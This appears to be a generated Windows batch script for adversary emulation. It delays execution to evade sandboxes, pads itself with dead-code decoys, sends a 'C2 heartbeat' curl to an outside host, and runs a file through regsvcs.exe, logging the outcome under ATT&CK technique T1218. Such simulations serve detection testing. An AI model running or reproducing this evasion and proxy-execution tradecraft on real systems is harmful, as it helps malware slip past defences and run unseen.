@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET txisnba=%APPDATA%\9283\b79f522d
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?9283-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=winword.txt
SET dvhhyc=9283
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log

SET state=0
GOTO vwlfjz

:dead_mnksp
REM Unreachable dead code block
SET junk=never_executed
GOTO END

:vwlfjz
REM Initial sandbox delay (random 30-60s)
SET /A rdelay=%RANDOM% %% 31 + 30
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: initial_delay_start=!rdelay!s>> "!logfile!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: initial_delay_complete>> "!logfile!" 2>nul
SET state=1
GOTO bqwtnd

:junk_txymg
REM Fake cleanup never called
del /f /q dummy.bat >nul 2>nul
GOTO END

:bqwtnd
IF !state!==1 GOTO xpcrfk
IF !state!==2 GOTO dlnszh
IF !state!==3 GOTO hmgpvf
IF !state!==4 GOTO END
GOTO dead_mnksp

:xpcrfk
REM C2 heartbeat (non-obfuscated curl)
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_complete>> "!logfile!" 2>nul

ping -n 10 127.0.0.1 >nul
SET state=2
GOTO bqwtnd

:dead_nvkcf
REM Another dead block
SET /A fake=1+1
GOTO END

:dlnszh
REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!logfile!" 2>nul
cd /d "!txisnba!" >nul 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_complete>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
SET state=3
GOTO bqwtnd

:junk_gprzs
REM More fake code
mkdir %TEMP%\fake >nul 2>nul
GOTO END

:hmgpvf
REM Execute regsvcs with .NET DLL
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: execution_start=!xzanpex!>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe "!xzanpex!"
SET tresult=1
SET terr=
IF !ERRORLEVEL! NEQ 0 (
    SET tresult=0
    SET terr=assembly_load_failed
)
echo [%DATE% %TIME%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!tresult!:!terr!>> "!logfile!" 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: execution_complete=!ERRORLEVEL!>> "!logfile!" 2>nul

SET state=4
GOTO bqwtnd

:END
ENDLOCAL